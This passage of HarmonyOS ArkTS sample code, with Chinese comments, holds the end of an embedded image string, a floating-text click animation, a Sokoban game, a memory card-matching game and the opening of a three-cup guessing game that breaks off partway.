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\u0026#39; // 初始化方法，在组件即将显示时被调用 aboutToAppear(): void { for (let i = 0; i \u0026lt; this.count; i++) { this.list.push(new Cell()); // 初始化 Cell 数组 } } // 构建 UI 的方法 build() { Column() { // 创建一个垂直布局容器 Stack() { // 创建一个堆栈布局容器 ForEach(this.list, (item: Cell, _index: number) =\u0026gt; { // 遍历 list 中的每一个 Cell Text(item.value)// 显示 Cell 中的文字 .fontColor(Color.White)// 设置文字颜色为白色 .fontSize(\u0026#39;50lpx\u0026#39;)// 设置文字大小 .translate({ x: 0, y: `${item.y}lpx` })// 设置文字的垂直偏移量 .opacity(item.opacity) // 设置文字的透明度 }) } .width(\u0026#39;300lpx\u0026#39;) // 设置堆栈布局容器的宽度 .height(\u0026#39;300lpx\u0026#39;) // 设置堆栈布局容器的高度 .align(Alignment.BottomEnd) // 设置对齐方式为底部右端 Image(this.image)// 显示图片 .width(\u0026#39;300lpx\u0026#39;)// 设置图片宽度 .height(\u0026#39;300lpx\u0026#39;)// 设置图片高度 .objectFit(ImageFit.Contain)// 图片适应容器 .clickEffect({ // 点击效果配置 scale: 0.5, // 缩放比例 level: ClickEffectLevel.LIGHT // 效果级别 }) .onClick(() =\u0026gt; { // 点击图片时触发的回调 let index = this.indexCount % this.count; // 计算当前滚动的索引 this.indexCount++; // 更新索引计数器 animateToImmediately({ // 立即开始动画 duration: 0, // 动画持续时间为0毫秒 onFinish: () =\u0026gt; { // 动画完成后的回调 animateToImmediately({ // 再次立即开始动画 duration: 1000, // 动画持续时间为1000毫秒 }, () =\u0026gt; { this.list[index].y = -200 // 设置 Cell 的垂直偏移量 this.list[index].opacity = 0 // 设置 Cell 的透明度 }) } }, () =\u0026gt; { this.list[index].y = 0 // 设置 Cell 的垂直偏移量 this.list[index].opacity = 1 // 设置 Cell 的透明度 }) }) } .height(\u0026#39;100%\u0026#39;) // 设置容器高度为100% .width(\u0026#39;100%\u0026#39;) // 设置容器宽度为100% .backgroundColor(Color.Black) // 设置背景颜色为黑色 } } Sokoban 推箱子\nimport { promptAction } from \u0026#39;@kit.ArkUI\u0026#39; // 导入ArkUI工具包中的提示操作模块 @ObservedV2 // 观察者模式装饰器 class Cell { // 定义游戏中的单元格类 @Trace // 跟踪装饰器，标记属性以被跟踪 type: number = 0; // 单元格类型，0：透明，1：墙，2：可移动区域 @Trace topLeft: number = 0; // 左上角圆角大小 @Trace topRight: number = 0; // 右上角圆角大小 @Trace bottomLeft: number = 0; // 左下角圆角大小 @Trace bottomRight: number = 0; // 右下角圆角大小 @Trace x: number = 0; // 单元格的X坐标偏移量 @Trace y: number = 0; // 单元格的Y坐标偏移量 constructor(cellType: number) { // 构造函数 this.type = cellType; // 初始化单元格类型 } } @ObservedV2 // 观察者模式装饰器 class MyPosition { // 定义位置类 @Trace // 跟踪装饰器，标记属性以被跟踪 x: number = 0; // X坐标 @Trace y: number = 0; // Y坐标 setPosition(x: number, y: number) { // 设置位置的方法 this.x = x; // 更新X坐标 this.y = y; // 更新Y坐标 } } @Entry // 入口装饰器 @Component // 组件装饰器 struct Sokoban { // 定义游戏主结构 cellWidth: number = 100; // 单元格宽度 @State grid: Cell[][] = [ // 游戏网格状态 [new Cell(0), new Cell(1), new Cell(1), new Cell(1), new Cell(1), new Cell(1)], [new Cell(1), new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1), new Cell(1)], [new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(1), new Cell(1), new Cell(2), new Cell(2), new Cell(2), new Cell(1)], [new Cell(0), new Cell(1), new Cell(1), new Cell(1), new Cell(1), new Cell(1)], ]; @State victoryPositions: MyPosition[] = [new MyPosition(), new MyPosition()]; // 胜利位置数组 @State cratePositions: MyPosition[] = [new MyPosition(), new MyPosition()]; // 箱子位置数组 playerPosition: MyPosition = new MyPosition(); // 玩家位置 @State screenStartX: number = 0; // 触摸开始时的屏幕X坐标 @State screenStartY: number = 0; // 触摸开始时的屏幕Y坐标 @State lastScreenX: number = 0; // 触摸结束时的屏幕X坐标 @State lastScreenY: number = 0; // 触摸结束时的屏幕Y坐标 @State startTime: number = 0; // 游戏开始时间 isAnimationRunning: boolean = false // 动画是否正在运行 aboutToAppear(): void { // 游戏加载前的准备工作 // 初始化某些单元格的圆角大小... this.grid[0][1].topLeft = 25; this.grid[0][5].topRight = 25; this.grid[1][0].topLeft = 25; this.grid[4][0].bottomLeft = 25; this.grid[5][1].bottomLeft = 25; this.grid[5][5].bottomRight = 25; this.grid[1][1].bottomRight = 10; this.grid[4][1].topRight = 10; this.grid[2][4].topLeft = 10; this.grid[2][4].bottomLeft = 10; this.initializeGame(); // 初始化游戏 } initializeGame() { // 初始化游戏状态 this.startTime = Date.now(); // 设置游戏开始时间为当前时间 // 设置胜利位置和箱子位置... this.startTime = Date.now(); // 设置游戏开始时间为当前时间 this.victoryPositions[0].setPosition(1, 3); this.victoryPositions[1].setPosition(1, 4); this.cratePositions[0].setPosition(2, 2); this.cratePositions[1].setPosition(2, 3); this.playerPosition.setPosition(1, 2); } isVictoryPositionVisible(x: number, y: number): boolean { // 判断位置是否为胜利位置 return this.victoryPositions.some(position =\u0026gt; position.x === x \u0026amp;\u0026amp; position.y === y); // 返回是否有胜利位置与给定位置匹配 } isCratePositionVisible(x: number, y: number): boolean { // 判断位置是否为箱子位置 return this.cratePositions.some(position =\u0026gt; position.x === x \u0026amp;\u0026amp; position.y === y); // 返回是否有箱子位置与给定位置匹配 } isPlayerPositionVisible(x: number, y: number): boolean { // 判断位置是否为玩家位置 return this.playerPosition.x === x \u0026amp;\u0026amp; this.playerPosition.y === y; // 返回玩家位置是否与给定位置相同 } movePlayer(direction: string) { const directions: object = Object({ \u0026#39;right\u0026#39;: Object({ dx: 0, dy: 1}), \u0026#39;left\u0026#39;: Object({ dx:0 , dy:-1 }), \u0026#39;down\u0026#39;: Object({ dx: 1, dy: 0 }), \u0026#39;up\u0026#39;: Object({ dx: -1, dy: 0 }) }); const dx: number = directions[direction][\u0026#39;dx\u0026#39;]; //{ dx, dy } const dy: number = directions[direction][\u0026#39;dy\u0026#39;]; //{ dx, dy } const newX: number = this.playerPosition.x + dx; const newY: number = this.playerPosition.y + dy; const targetCell = this.grid[newX][newY]; // 检查新位置是否超出边界 if (!targetCell) { return; } // 如果新位置是墙，则不能移动 if (targetCell.type === 1) { return; } let crateIndex = -1; if (this.isCratePositionVisible(newX, newY)) { const crateBehindCell = this.grid[newX + dx][newY + dy]; if (!crateBehindCell || crateBehindCell.type !== 2) { return; } crateIndex = this.cratePositions.findIndex(crate =\u0026gt; crate.x === newX \u0026amp;\u0026amp; crate.y === newY); if (crateIndex === -1 || this.isCratePositionVisible(newX + dx, newY + dy)) { return; } } if (this.isAnimationRunning) { return } this.isAnimationRunning = true animateToImmediately({ duration: 150, onFinish: () =\u0026gt; { animateToImmediately({ duration: 0, onFinish: () =\u0026gt; { this.isAnimationRunning = false } }, () =\u0026gt; { if (crateIndex !== -1) { this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].x = 0; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].y = 0; this.cratePositions[crateIndex].x += dx; this.cratePositions[crateIndex].y += dy; } this.grid[this.playerPosition.x][this.playerPosition.y].x = 0 this.grid[this.playerPosition.x][this.playerPosition.y].y = 0 this.playerPosition.setPosition(newX, newY); // 检查是否获胜 const isAllCrateOnTarget = this.cratePositions.every(crate =\u0026gt; { return this.victoryPositions.some(victory =\u0026gt; crate.x === victory.x \u0026amp;\u0026amp; crate.y === victory.y); }); if (isAllCrateOnTarget) { console.log(\u0026#34;恭喜你，你赢了！\u0026#34;); // 可以在这里添加胜利处理逻辑 promptAction.showDialog({ // 显示对话框 title: \u0026#39;游戏胜利！\u0026#39;, // 对话框标题 message: \u0026#39;恭喜你，用时：\u0026#39; + ((Date.now() - this.startTime) / 1000).toFixed(3) + \u0026#39;秒\u0026#39;, // 对话框消息 buttons: [{ text: \u0026#39;重新开始\u0026#39;, color: \u0026#39;#ffa500\u0026#39; }] // 对话框按钮 }).then(() =\u0026gt; { // 对话框关闭后执行 this.initializeGame(); // 重新开始游戏 }); } }) } }, () =\u0026gt; { this.grid[this.playerPosition.x][this.playerPosition.y].x = dy * this.cellWidth; this.grid[this.playerPosition.x][this.playerPosition.y].y = dx * this.cellWidth; if (crateIndex !== -1) { this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].x = dy * this.cellWidth; this.grid[this.cratePositions[crateIndex].x][this.cratePositions[crateIndex].y].y = dx * this.cellWidth; } console.info(`dx:${dx},dy:${dy}`) }) } build() { Column({ space: 20 }) { //游戏区 Stack() { //非零区加瓷砖 Column() { ForEach(this.grid, (row: [], rowIndex: number) =\u0026gt; { Row() { ForEach(row, (item: Cell, colIndex: number) =\u0026gt; { Stack() { Text() .width(`${this.cellWidth}lpx`) .height(`${this.cellWidth}lpx`) .backgroundColor(item.type == 0 ? Color.Transparent : ((rowIndex + colIndex) % 2 == 0 ? \u0026#34;#cfb381\u0026#34; : \u0026#34;#e1ca9f\u0026#34;)) .borderRadius({ topLeft: item.topLeft \u0026gt; 10 ? item.topLeft : 0, topRight: item.topRight \u0026gt; 10 ? item.topRight : 0, bottomLeft: item.bottomLeft \u0026gt; 10 ? item.bottomLeft : 0, bottomRight: item.bottomRight \u0026gt; 10 ? item.bottomRight : 0 }) //如果和是胜利坐标，显示叉号 Stack() { Text() .width(`${this.cellWidth / 2}lpx`) .height(`${this.cellWidth / 8}lpx`) .backgroundColor(Color.White) Text() .width(`${this.cellWidth / 8}lpx`) .height(`${this.cellWidth / 2}lpx`) .backgroundColor(Color.White) }.rotate({ angle: 45 }) .visibility(this.isVictoryPositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) } }) } }) } Column() { ForEach(this.grid, (row: [], rowIndex: number) =\u0026gt; { Row() { ForEach(row, (item: Cell, colIndex: number) =\u0026gt; { //是否显示箱子 Stack() { Text() .width(`${this.cellWidth}lpx`) .height(`${this.cellWidth}lpx`) .backgroundColor(item.type == 1 ? \u0026#34;#412c0f\u0026#34; : Color.Transparent) .borderRadius({ topLeft: item.topLeft, topRight: item.topRight, bottomLeft: item.bottomLeft, bottomRight: item.bottomRight }) Text(\u0026#39;箱\u0026#39;) .fontColor(Color.White) .textAlign(TextAlign.Center) .fontSize(`${this.cellWidth / 2}lpx`) .width(`${this.cellWidth - 5}lpx`) .height(`${this.cellWidth - 5}lpx`) .backgroundColor(\u0026#34;#cb8321\u0026#34;)//#995d12 #cb8321 .borderRadius(10) .visibility(this.isCratePositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) Text(\u0026#39;我\u0026#39;) .fontColor(Color.White) .textAlign(TextAlign.Center) .fontSize(`${this.cellWidth / 2}lpx`) .width(`${this.cellWidth - 5}lpx`) .height(`${this.cellWidth - 5}lpx`) .backgroundColor(\u0026#34;#007dfe\u0026#34;)//#995d12 #cb8321 .borderRadius(10) .visibility(this.isPlayerPositionVisible(rowIndex, colIndex) ? Visibility.Visible : Visibility.None) } .width(`${this.cellWidth}lpx`) .height(`${this.cellWidth}lpx`) .translate({ x: `${item.x}lpx`, y: `${item.y}lpx` }) }) } }) } } Button(\u0026#39;重新开始\u0026#39;).clickEffect({ level: ClickEffectLevel.MIDDLE }) .onClick(() =\u0026gt; { this.initializeGame(); }); } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#34;#fdb300\u0026#34;) .padding({ top: 20 }) .onTouch((e) =\u0026gt; { if (e.type === TouchType.Down \u0026amp;\u0026amp; e.touches.length \u0026gt; 0) { // 触摸开始，记录初始位置 this.screenStartX = e.touches[0].x; this.screenStartY = e.touches[0].y; } else if (e.type === TouchType.Up \u0026amp;\u0026amp; e.changedTouches.length \u0026gt; 0) { // 当手指抬起时，更新最后的位置 this.lastScreenX = e.changedTouches[0].x; this.lastScreenY = e.changedTouches[0].y; } }) .gesture( SwipeGesture({ direction: SwipeDirection.All })// 支持方向中 all可以是上下左右 .onAction((_event: GestureEvent) =\u0026gt; { const swipeX = this.lastScreenX - this.screenStartX; const swipeY = this.lastScreenY - this.screenStartY; // 清除开始位置记录，准备下一次滑动判断 this.screenStartX = 0; this.screenStartY = 0; if (Math.abs(swipeX) \u0026gt; Math.abs(swipeY)) { if (swipeX \u0026gt; 0) { // 向右滑动 this.movePlayer(\u0026#39;right\u0026#39;); } else { // 向左滑动 this.movePlayer(\u0026#39;left\u0026#39;); } } else { if (swipeY \u0026gt; 0) { // 向下滑动 this.movePlayer(\u0026#39;down\u0026#39;); } else { // 向上滑动 this.movePlayer(\u0026#39;up\u0026#39;); } } }) ) } } Memory Flip 记忆翻转\nimport { promptAction } from \u0026#39;@kit.ArkUI\u0026#39; // 导入用于显示对话框的模块 // 使用装饰器来观察数据变化 @ObservedV2 class GameCell { // 定义单元格类 @Trace value: string; // 单元格的值，即卡片上的图案 @Trace isVisible: boolean = false; // 控制卡片是否可见 isFrontVisible: boolean = false; // 控制卡片是否正面朝上 isMatched: boolean = false; // 标记卡片是否已被匹配 isAnimationRunning: boolean = false; // 动画是否正在运行 @Trace rotationAngle: number = 0; // 卡片的旋转角度 constructor(value: string) { // 构造函数，初始化单元格 this.value = value; // 设置单元格的值 } // 展示卡片正面的方法 revealFace(animationTime: number, callback?: () =\u0026gt; void) { if (this.isAnimationRunning) { // 如果已经有动画在运行，则返回 return; } this.isAnimationRunning = true; // 设置动画状态为运行中 animateToImmediately({ // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 animateToImmediately({ // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 this.isFrontVisible = true; // 设置卡片为正面朝上 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } }, () =\u0026gt; { // 动画开始时的回调 this.isVisible = true; // 设置卡片为可见 this.rotationAngle = 0; // 设置旋转角度为0 }); } }, () =\u0026gt; { // 动画开始时的回调 this.isVisible = false; // 设置卡片为不可见 this.rotationAngle = 90; // 设置旋转角度为90度 }); } // 重置卡片状态的方法 reset() { this.isVisible = false; // 设置卡片为不可见 this.rotationAngle = 180; // 设置旋转角度为180度 this.isFrontVisible = false; // 设置卡片为背面朝上 this.isAnimationRunning = false; // 设置动画状态为停止 this.isMatched = false; // 设置卡片为未匹配 } // 隐藏卡片正面的方法 hideFace(animationTime: number, callback?: () =\u0026gt; void) { if (this.isAnimationRunning) { // 如果已经有动画在运行，则返回 return; } this.isAnimationRunning = true; // 设置动画状态为运行中 animateToImmediately({ // 开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 animateToImmediately({ // 再次开始动画 duration: animationTime, // 动画持续时间 iterations: 1, // 动画迭代次数 curve: Curve.Linear, // 动画曲线类型 onFinish: () =\u0026gt; { // 动画完成后的回调 this.isFrontVisible = false; // 设置卡片为背面朝上 this.isAnimationRunning = false; // 设置动画状态为停止 if (callback) { // 如果有回调函数，则执行 callback(); } } }, () =\u0026gt; { // 动画开始时的回调 this.isVisible = false; // 设置卡片为不可见 this.rotationAngle = 180; // 设置旋转角度为180度 }); } }, () =\u0026gt; { // 动画开始时的回调 this.isVisible = true; // 设置卡片为可见 this.rotationAngle = 90; // 设置旋转角度为90度 }); } } // 定义组件入口 @Entry @Component struct MemoryGame { // 定义游戏组件 @State gameCells: GameCell[] = []; // 存储游戏中的所有单元格 @State cellSize: number = 150; // 单元格的大小 @State cellSpacing: number = 5; // 单元格之间的间距 @State transitionDuration: number = 150; // 过渡动画的持续时间 @State firstSelectedIndex: number | null = null; // 记录第一次选择的卡片索引 @State secondSelectedIndex: number | null = null; // 记录第二次选择的卡片索引 @State isGameOver: boolean = false; // 游戏是否结束 @State startTime: number = 0; // 游戏开始时间 aboutToAppear(): void { // 组件即将显示时触发 let cardValues: string[] = [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;, \u0026#34;D\u0026#34;, \u0026#34;E\u0026#34;, \u0026#34;F\u0026#34;, \u0026#34;G\u0026#34;, \u0026#34;H\u0026#34;]; // 定义卡片的值 for (let value of cardValues) { // 遍历卡片值 this.gameCells.push(new GameCell(value)); // 添加到游戏单元格数组中 this.gameCells.push(new GameCell(value)); // 每个值添加两次以形成对 } this.shuffleCards(); // 洗牌 } // 洗牌方法 shuffleCards() { this.firstSelectedIndex = null; // 清除第一次选择索引 this.secondSelectedIndex = null; // 清除第二次选择索引 this.isGameOver = false; // 游戏未结束 this.startTime = Date.now(); // 设置游戏开始时间为当前时间 for (let i = 0; i \u0026lt; 16; i++) { // 重置所有单元格状态 this.gameCells[i].reset(); } for (let i = this.gameCells.length - 1; i \u0026gt; 0; i--) { // 洗牌算法 const randomIndex = Math.floor(Math.random() * (i + 1)); // 随机索引 let tempValue = this.gameCells[i].value; // 临时保存值 this.gameCells[i].value = this.gameCells[randomIndex].value; // 交换值 this.gameCells[randomIndex].value = tempValue; // 交换值 } } // 检查卡片是否匹配的方法 checkForMatch() { if (this.firstSelectedIndex !== null \u0026amp;\u0026amp; this.secondSelectedIndex !== null) { // 确保两个索引都不为空 const firstCell = this.gameCells[this.firstSelectedIndex]; // 获取第一个选中的单元格 const secondCell = this.gameCells[this.secondSelectedIndex]; // 获取第二个选中的单元格 if (firstCell.value === secondCell.value) { // 如果两个单元格的值相同 firstCell.isMatched = true; // 标记为已匹配 secondCell.isMatched = true; // 标记为已匹配 this.firstSelectedIndex = null; // 清除第一次选择索引 this.secondSelectedIndex = null; // 清除第二次选择索引 if (this.gameCells.every(cell =\u0026gt; cell.isMatched)) { // 如果所有单元格都已匹配 this.isGameOver = true; // 游戏结束 console.info(\u0026#34;游戏结束\u0026#34;); // 打印信息 promptAction.showDialog({ // 显示对话框 title: \u0026#39;游戏胜利！\u0026#39;, // 对话框标题 message: \u0026#39;恭喜你，用时：\u0026#39; + ((Date.now() - this.startTime) / 1000).toFixed(3) + \u0026#39;秒\u0026#39;, // 对话框消息 buttons: [{ text: \u0026#39;重新开始\u0026#39;, color: \u0026#39;#ffa500\u0026#39; }] // 对话框按钮 }).then(() =\u0026gt; { // 对话框关闭后执行 this.shuffleCards(); // 重新开始游戏 }); } } else { // 如果两个单元格的值不同 setTimeout(() =\u0026gt; { // 延迟一段时间后 if (this.firstSelectedIndex !== null) { // 如果第一个索引不为空 this.gameCells[this.firstSelectedIndex].hideFace(this.transitionDuration, () =\u0026gt; { // 隐藏卡片 this.firstSelectedIndex = null; // 清除第一次选择索引 }); } if (this.secondSelectedIndex !== null) { // 如果第二个索引不为空 this.gameCells[this.secondSelectedIndex].hideFace(this.transitionDuration, () =\u0026gt; { // 隐藏卡片 this.secondSelectedIndex = null; // 清除第二次选择索引 }); } }, 400); // 延迟时间 } } } // 构建游戏界面的方法 build() { Column({ space: 20 }) { // 创建一个垂直布局 Flex({ wrap: FlexWrap.Wrap }) { // 创建一个可换行的弹性布局 ForEach(this.gameCells, (gameCell: GameCell, index: number) =\u0026gt; { // 遍历游戏单元格 Text(`${gameCell.isVisible ? gameCell.value : \u0026#39;\u0026#39;}`) // 显示单元格的值或空字符串 .width(`${this.cellSize}lpx`) // 设置宽度 .height(`${this.cellSize}lpx`) // 设置高度 .margin(`${this.cellSpacing}lpx`) // 设置边距 .fontSize(`${this.cellSize / 2}lpx`) // 设置字体大小 .textAlign(TextAlign.Center) // 文本居中 .backgroundColor(gameCell.isVisible ? Color.Orange : Color.Gray) // 设置背景颜色 .fontColor(Color.White) // 设置字体颜色 .borderRadius(5) // 设置圆角 .rotate({ // 设置旋转 x: 0, y: 1, z: 0, angle: gameCell.rotationAngle, // 旋转角度 centerX: `${this.cellSize / 2}lpx`, // 中心点X坐标 centerY: `${this.cellSize / 2}lpx`, // 中心点Y坐标 }) .onClick(() =\u0026gt; { // 单击事件处理 if (this.isGameOver) { // 如果游戏已结束 console.info(\u0026#34;游戏已结束\u0026#34;); // 打印信息 return; } if (gameCell.isMatched) { // 如果单元格已匹配 console.info(\u0026#34;当前已标记\u0026#34;); // 打印信息 return; } if (this.firstSelectedIndex == null) { // 如果没有第一次选择 this.firstSelectedIndex = index; // 设置第一次选择索引 if (!gameCell.isFrontVisible) { // 如果不是正面朝上 gameCell.revealFace(this.transitionDuration); // 展示正面 } } else if (this.firstSelectedIndex == index) { // 如果与第一次选择相同 console.info(\u0026#34;和上一次点击的是一样的，不予处理\u0026#34;); // 打印信息 } else if (this.secondSelectedIndex == null) { // 如果没有第二次选择 this.secondSelectedIndex = index; // 设置第二次选择索引 if (!gameCell.isFrontVisible) { // 如果不是正面朝上 gameCell.revealFace(this.transitionDuration, () =\u0026gt; { // 展示正面 this.checkForMatch(); // 检查是否匹配 }); } } }); }); }.width(`${(this.cellSize + this.cellSpacing * 2) * 4}lpx`); // 设置宽度 Button(\u0026#39;重新开始\u0026#39;) // 创建“重新开始”按钮 .onClick(() =\u0026gt; { // 按钮点击事件 this.shuffleCards(); // 重新开始游戏 }); }.height(\u0026#39;100%\u0026#39;).width(\u0026#39;100%\u0026#39;); // 设置高度和宽度 } } 3cup ball 三杯猜球\n// 使用装饰器来追踪对象的变化 @ObservedV2 class Cup { // 使用装饰器来追踪属性的变化 @Trace positionX: number; // 杯子的X轴位置 @Trace positionY: number; // 杯子的Y轴位置 @Trace containsBall: boolean; // 杯子内是否有球 @Trace isRevealed: boolean; // 杯子是否打开 // 构造函数初始化杯子的状态 constructor(hasBall: boolean) { this.positionX = 0; this.positionY = 0; this.containsBall = hasBall; this.isRevealed = true; } } // 游戏入口组件 @Entry @Component struct ThreeCupGame { // 游戏状态变量 @State gameCups: Cup[] = [// 初始化三个杯子，其中一个有球 new Cup(true), new Cup(false), new Cup(false) ]; @State cupWidth: number = 200; // 杯子宽度 @State cupSpacing: number = 10; 